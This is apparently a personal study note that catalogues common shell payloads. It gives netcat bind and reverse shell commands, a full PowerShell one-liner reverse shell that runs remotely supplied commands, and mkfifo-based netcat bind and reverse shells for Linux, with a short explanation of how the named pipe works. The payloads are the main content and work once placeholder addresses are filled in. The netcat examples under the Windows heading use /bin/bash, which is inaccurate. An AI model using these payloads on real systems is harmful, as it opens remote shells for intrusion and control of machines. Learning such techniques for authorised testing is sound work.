# Examples of common [[Shell]] payloads

## Windows

The following payloads are commonly used in Windows machines. In [[Netcat]], there is an `-e` option which allows us to execute a process on connection, allowing is to use the following commands: 
- `nc -lvnp <PORT> -e /bin/bash` - [[Bind Shell]] using [[Netcat]]
- `nc <LOCAL-IP> <PORT> -e /bin/bash` - [[Reverse Shell]] using [[Netcat]]

When targeting a Windows server, we can use Powershell to establish a reverse shell

```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('**<ip>**',**<port>**);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## Linux

```bash
mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```
 
The command first creates a [named pipe](https://www.linuxjournal.com/article/2156) at `/tmp/f`. It then starts a netcat listener, and connects the input of the listener to the output of the named pipe. The output of the netcat listener (i.e. the commands we send) then gets piped directly into `sh`, sending the stderr output stream into stdout, and sending stdout itself into the input of the named pipe, thus completing the circle.

![[Pasted image 20260507093724.png]]

A similar command for [[Reverse Shell]]

```bash
mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```
![[Pasted image 20260507093906.png]]

